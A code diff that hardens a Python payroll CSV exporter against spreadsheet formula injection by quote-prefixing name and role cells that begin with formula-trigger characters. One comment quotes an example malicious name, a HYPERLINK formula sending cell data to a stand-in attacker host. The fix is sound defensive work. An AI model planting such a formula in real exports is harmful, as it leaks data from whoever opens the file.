@@ -4,6 +4,24 @@ import csv
 import io
 from typing import Any, Dict, List
 
+# A cell whose text starts with one of these is a live formula to Excel/Sheets/Numbers
+# the moment the file is opened - '=', '+' and '-' start a formula, '@' triggers an
+# old-style Lotus/Excel macro, and a leading tab or CR can smuggle a second "cell" past
+# naive parsers. An employee name or role is free text a staff member or manager
+# chooses, so it must never reach a payroll CSV able to run code or call out to a URL
+# (e.g. a name of '=HYPERLINK("http://evil.example/"&A1,"click")') just because someone
+# opens the export in a spreadsheet.
+_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_formula_guard(value: str) -> str:
+    """Prefixes a leading formula-trigger character with a single quote, which Excel/
+    Sheets/Numbers treat as "force text" and never render, so the cell is shown and
+    stored as literal text instead of being evaluated."""
+    if value.startswith(_FORMULA_TRIGGER_CHARS):
+        return "'" + value
+    return value
+
 
 class PayrollExportEngine:
     """Formats calculated labor records into standard payroll provider ingestion formats."""
@@ -43,8 +61,8 @@ class PayrollExportEngine:
 
             writer.writerow([
                 emp_id,
-                name,
-                role,
+                _csv_formula_guard(str(name)),
+                _csv_formula_guard(str(role)),
                 f"{reg:.2f}",
                 f"{ot:.2f}",
                 wage,
@@ -92,7 +110,7 @@ class PayrollExportEngine:
                 company_code,
                 batch_id,
                 emp_id,
-                name,
+                _csv_formula_guard(str(name)),
                 f"{reg:.2f}",
                 f"{ot:.2f}",
                 wage,
